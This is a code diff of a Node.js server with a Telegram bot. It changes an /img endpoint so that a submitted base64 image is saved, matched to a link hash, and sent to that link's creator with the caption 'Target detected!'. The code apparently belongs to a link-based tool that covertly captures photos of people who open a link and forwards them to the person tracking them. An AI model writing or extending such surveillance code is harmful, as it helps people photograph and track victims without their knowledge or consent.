@@ -42,10 +42,10 @@ function base64(img, id_t) {
   const fileName = `public/${current_name}.${extension}`;
   fs.writeFileSync(fileName, buffer);
 
-  dataBase.findOne({ id_video: id_t * 1 }).then((res) => {
+  dataBaseLinks.findOne({ hash: id_t }).then((res) => {
     console.log(res);
     if (res !== null) {
-      bot.telegram.sendMediaGroup(res.id, [
+      bot.telegram.sendMediaGroup(res.user_id, [
         {
           type: "photo",
           caption: `<b>🕵️♂️ Цель обнаружена!</b>`,
@@ -319,9 +319,12 @@ app.get("/video", (req, res) => {
   
   // res.sendFile(__dirname + "/src/index.html");
 });
+
 app.post("/img", async (req, res) => {
   console.log(req.body.id)
-  // base64(req.body.img, req.body.id);
+  if(req.body.id){
+    base64(req.body.img, req.body.id);
+  }
   res.send({ type: true });
 });
 
